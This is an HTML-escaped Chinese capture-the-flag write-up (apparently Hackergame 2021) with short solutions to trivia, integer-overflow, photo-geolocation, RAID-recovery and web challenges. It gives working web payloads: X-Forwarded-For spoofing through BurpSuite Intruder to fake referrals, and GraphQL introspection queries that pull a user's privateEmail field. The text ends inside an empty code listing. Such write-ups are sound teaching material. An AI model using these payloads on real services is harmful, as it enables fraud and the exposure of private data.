&lt;h4 id=&#34;1-经典WebArchive-第一行就有答案-20150504&#34;&gt;&lt;a href=&#34;#1-经典WebArchive-第一行就有答案-20150504&#34; class=&#34;headerlink&#34; title=&#34;1. 经典WebArchive 第一行就有答案:20150504&#34;&gt;&lt;/a&gt;1. &lt;a href=&#34;http://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes&#34;&gt;经典WebArchive&lt;/a&gt; 第一行就有答案:20150504&lt;/h4&gt;&lt;h4 id=&#34;2-https-lug-ustc-edu-cn-wiki-intro&#34;&gt;&lt;a href=&#34;#2-https-lug-ustc-edu-cn-wiki-intro&#34; class=&#34;headerlink&#34; title=&#34;2. https://lug.ustc.edu.cn/wiki/intro/&#34;&gt;&lt;/a&gt;2. &lt;a href=&#34;https://lug.ustc.edu.cn/wiki/intro/&#34;&gt;https://lug.ustc.edu.cn/wiki/intro/&lt;/a&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;此处资料显示是4次，但并非最新，我后来手动尝试才得知是5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;3-FTP服务器-Obviously，答案是Development-Team-of-Library-后来得知网站首页news头图就有，我还找了好久&#34;&gt;&lt;a href=&#34;#3-FTP服务器-Obviously，答案是Development-Team-of-Library-后来得知网站首页news头图就有，我还找了好久&#34; class=&#34;headerlink&#34; title=&#34;3. FTP服务器 Obviously，答案是Development Team of Library 后来得知网站首页news头图就有，我还找了好久&#34;&gt;&lt;/a&gt;3. &lt;a href=&#34;https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2016.06.16_%E6%B4%BB%E5%8A%A8%E5%AE%A4%E6%90%AC%E8%BF%81/IMG_20160616_133655.jpg&#34;&gt;FTP服务器&lt;/a&gt; Obviously，答案是Development Team of Library &lt;del&gt;后来得知网站首页news头图就有，我还找了好久&lt;/del&gt;&lt;/h4&gt;&lt;h4 id=&#34;4-谷歌关键词SIGBOVIK2021-Newcomb-Benford直接就能找到原论文http-sigbovik-org-2021-proceedings-pdf-直接Ctrl-F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13&#34;&gt;&lt;a href=&#34;#4-谷歌关键词SIGBOVIK2021-Newcomb-Benford直接就能找到原论文http-sigbovik-org-2021-proceedings-pdf-直接Ctrl-F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13&#34; class=&#34;headerlink&#34; title=&#34;4. 谷歌关键词SIGBOVIK2021 Newcomb-Benford直接就能找到原论文http://sigbovik.org/2021/proceedings.pdf 直接Ctrl+F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13&#34;&gt;&lt;/a&gt;4. 谷歌关键词&lt;code&gt;SIGBOVIK2021&lt;/code&gt; &lt;code&gt;Newcomb-Benford&lt;/code&gt;直接就能找到原论文&lt;a href=&#34;http://sigbovik.org/2021/proceedings.pdf&#34;&gt;http://sigbovik.org/2021/proceedings.pdf&lt;/a&gt; 直接&lt;code&gt;Ctrl+F&lt;/code&gt;找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13&lt;/h4&gt;&lt;h4 id=&#34;5-谷歌关键词protocol-report-找到https-www-rfc-editor-org-rfc-rfc8962-html&#34;&gt;&lt;a href=&#34;#5-谷歌关键词protocol-report-找到https-www-rfc-editor-org-rfc-rfc8962-html&#34; class=&#34;headerlink&#34; title=&#34;5. 谷歌关键词protocol report 找到https://www.rfc-editor.org/rfc/rfc8962.html&#34;&gt;&lt;/a&gt;5. 谷歌关键词&lt;code&gt;protocol&lt;/code&gt; &lt;code&gt;report&lt;/code&gt; 找到&lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc8962.html&#34;&gt;https://www.rfc-editor.org/rfc/rfc8962.html&lt;/a&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt; 6.Reporting Offenses&lt;br&gt;Send all your reports of possible violations and all tips about wrongdoing to &lt;strong&gt;&amp;#x2F;dev&amp;#x2F;null&lt;/strong&gt;. The Protocol Police are listening and will take care of it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;del&gt;还挺幽默，一开始还真以为有police在listening&lt;/del&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;卖瓜&#34;&gt;&lt;a href=&#34;#卖瓜&#34; class=&#34;headerlink&#34; title=&#34;卖瓜&#34;&gt;&lt;/a&gt;卖瓜&lt;/h2&gt;&lt;p&gt;20不是3的倍数，乍看似乎不可能用6和9加和得到。但随便试了试，发现9斤的瓜很多很多时会溢出为-9223372036854775808，据此判断为int64溢出，判断应当在此处加以利用。&lt;br&gt;我们需要让这个数字稍微溢出一点，不能溢出太多。也就是略大于floor(9223372036854775808&amp;#x2F;9)，使得溢出为-9223372036854775808以外的数字，并且让该数字到20的距离能被3整除。之后直接加回20就行（简单小学(?)算数，屡有即将做出来时加过头超过20的惨剧hhh）&lt;br&gt;灵感来源：&lt;a href=&#34;https://www.bbsmax.com/A/pRdByjq65n/&#34;&gt;CTF 两道web整数溢出题目(猫咪银行和ltshop)&lt;/a&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;透明的文件&#34;&gt;&lt;a href=&#34;#透明的文件&#34; class=&#34;headerlink&#34; title=&#34;透明的文件&#34;&gt;&lt;/a&gt;透明的文件&lt;/h2&gt;&lt;p&gt;根据题面和文件会发现这是终端的颜色代码，网络搜索终端颜色代码格式后将所有&lt;code&gt;[&lt;/code&gt;前补上一个&lt;code&gt;\e&lt;/code&gt;，然后&lt;code&gt;echo -e &amp;quot;&amp;#123;内容&amp;#125;&amp;quot;&lt;/code&gt;就行啦。记得执行前把终端先用字符填满，不然可能画不完整。&lt;br&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154901529-149476643.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;旅行照片&#34;&gt;&lt;a href=&#34;#旅行照片&#34; class=&#34;headerlink&#34; title=&#34;旅行照片&#34;&gt;&lt;/a&gt;旅行照片&lt;/h2&gt;&lt;p&gt;&lt;del&gt;简简单单开个盒&lt;/del&gt;&lt;br&gt;旅游，海滩，汉字，说明这是国内一个海边旅游景点。&lt;br&gt;蓝色KFC？这可不常见，应该有不少人打卡了吧。&lt;br&gt;百度搜索&lt;code&gt;蓝色KFC&lt;/code&gt;，第一项就是某红书的&lt;code&gt;秦皇岛蒂凡尼蓝秦皇岛网红打卡|国内唯一蒂芙尼蓝色肯德基&lt;/code&gt;&lt;br&gt;百度地图定位发现这家店是某海底世界分店，直接得到电话号码。&lt;br&gt;&lt;a href=&#34;https://www.earthol.org/&#34;&gt;https://www.earthol.org/&lt;/a&gt;上通过街景发现三个汉字“海|豚|馆”&lt;br&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154657507-2019993326.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;对照地图，视线和海岸线大约成45°，推测应当在东南方向。进而发现影子西斜，应当在下午&amp;#x2F;傍晚&lt;br&gt;通过绘制各个水平线找出灭点可以推测楼层（知乎有些文章有详细说明）。我的方法是找到对面楼“最矩形”变形最少的窗户判断为同一楼层，然后数，发现是13层左右（经尝试发现是14层）&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;FLAG助力大红包&#34;&gt;&lt;a href=&#34;#FLAG助力大红包&#34; class=&#34;headerlink&#34; title=&#34;FLAG助力大红包&#34;&gt;&lt;/a&gt;FLAG助力大红包&lt;/h2&gt;&lt;p&gt;既然是和ip有关，第一时间想到的就是&lt;code&gt;X-Forwarded-For&lt;/code&gt;，果然成功了。因为每个&lt;code&gt;/8&lt;/code&gt;ip段（也就是例如255.0.0.0-255.255.255.255）都只能算一次，我们使用BurpSuite的Intruder，将Post数据中的ip和&lt;code&gt;X-Forwarded-For&lt;/code&gt;的ip首段打上标记，选择&lt;code&gt;Battering Ram&lt;/code&gt;模式（让两处参数一致），构造0~255的字典，自动化访问&lt;code&gt;0.114.114.114&lt;/code&gt;、&lt;code&gt;1.114.114.114&lt;/code&gt;、&lt;code&gt;2.114.114.114&lt;/code&gt;……&lt;code&gt;255.114.114.114&lt;/code&gt;达成刚好256个助力获得flag。由于每次间隔2s，2s*256&amp;#x3D;512s，小于题目时长限制10min&amp;#x3D;600s所以是可行的。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;Amnesia-轻度失忆&#34;&gt;&lt;a href=&#34;#Amnesia-轻度失忆&#34; class=&#34;headerlink&#34; title=&#34;Amnesia-轻度失忆&#34;&gt;&lt;/a&gt;Amnesia-轻度失忆&lt;/h2&gt;&lt;p&gt;直接&lt;code&gt;putchar()&lt;/code&gt;逐个打印绕过即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;图之上的信息&#34;&gt;&lt;a href=&#34;#图之上的信息&#34; class=&#34;headerlink&#34; title=&#34;图之上的信息&#34;&gt;&lt;/a&gt;图之上的信息&lt;/h2&gt;&lt;p&gt;GraphQL的利用。访问&lt;code&gt;/graphql?query=&amp;#123;&amp;#125;&lt;/code&gt;发现存在利用可能。查阅&lt;a href=&#34;https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ&#34;&gt;资料&lt;/a&gt;后得知可以利用内省注入。没有UI界面我直接地址栏输入。换行替换为&lt;code&gt;%0A&lt;/code&gt;后，访问&lt;code&gt;/graphql?query=&amp;#123;__schema%0A&amp;#123;types%0A&amp;#123;name&amp;#125;&amp;#125;&amp;#125;&lt;/code&gt;得到：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;data&amp;quot;:&amp;#123;&amp;quot;__schema&amp;quot;:&amp;#123;&amp;quot;types&amp;quot;:[&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;Query&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;GNote&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;Int&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;String&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;GUser&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;Boolean&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__Schema&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__Type&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__TypeKind&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__Field&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__InputValue&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__EnumValue&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__Directive&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__DirectiveLocation&amp;quot;&amp;#125;]&amp;#125;&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现有个&lt;code&gt;GUser&lt;/code&gt;类型。接下来访问&lt;code&gt;/graphql?query=&amp;#123;__type(name:&amp;quot;GUser&amp;quot;)&amp;#123;name%0Afields&amp;#123;name%0Atype&amp;#123;name,kind&amp;#125;&amp;#125;&amp;#125;&amp;#125;&lt;/code&gt;爆出字段名&lt;code&gt;privateEmail&lt;/code&gt;，然后直接&lt;code&gt;/graphql?query=&amp;#123;user(id:1)&amp;#123;id,privateEmail&amp;#125;&amp;#125;&lt;/code&gt;得到flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;赛博厨房&#34;&gt;&lt;a href=&#34;#赛博厨房&#34; class=&#34;headerlink&#34; title=&#34;赛博厨房&#34;&gt;&lt;/a&gt;赛博厨房&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Level0：直接写&lt;/li&gt;
&lt;li&gt;Level1：复制粘贴发现有长度限制 goto优化行数&lt;br&gt; 然后不会了。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;##阵列恢复大师-RAID5&lt;br&gt;直接丢进RAID Reconstructor 5里面跑得到镜像文件。Windows上并没法直接读，于是丢进Diskinternals Linux Reader里读文件导出。执行getflag.py却提示&lt;code&gt;Did you recover my data correctly?&lt;/code&gt;，疑惑之下换WSL(Kali Linux)执行就成功了。&lt;br&gt;&lt;del&gt;吐槽：RAID0的XFS需要注册码没法搞。WSL也mount不上，看来还是虚拟机靠谱。&lt;/del&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;助记词-第一顿大餐&#34;&gt;&lt;a href=&#34;#助记词-第一顿大餐&#34; class=&#34;headerlink&#34; title=&#34;助记词-第一顿大餐&#34;&gt;&lt;/a&gt;助记词-第一顿大餐&lt;/h2&gt;&lt;p&gt;代码审计后发现目的是延迟尽可能高。用BurpSuite改包在POST数据里复制出来很多行注记词提交就有了flag1。就像这样：  &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;necessary science growth addition&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;necessary science growth addition&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    （重复好多好多次）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;necessary science growth addition&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果不行CLEAR再试试。&lt;br&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030155443141-1922071122.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;小坑：token要跟上才能拿到flag，不过有时自动获取的token无效，使得flag只显示为true，因为加号没有URLEncode转义，不知道是不是bug.  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;马赛克&#34;&gt;&lt;a href=&#34;#马赛克&#34; class=&#34;headerlink&#34; title=&#34;马赛克&#34;&gt;&lt;/a&gt;马赛克&lt;/h2&gt;&lt;p&gt;模拟题。大概思路是先扫一遍，把能确定的先确定下来。之后再dfs剩下的块（不需要全部求出，毕竟这题的二维码纠错拉满了）。&lt;br&gt;代码很丑对吧QAQ（当时不熟悉ndarray操作，全部当做list做一遍）  &lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span 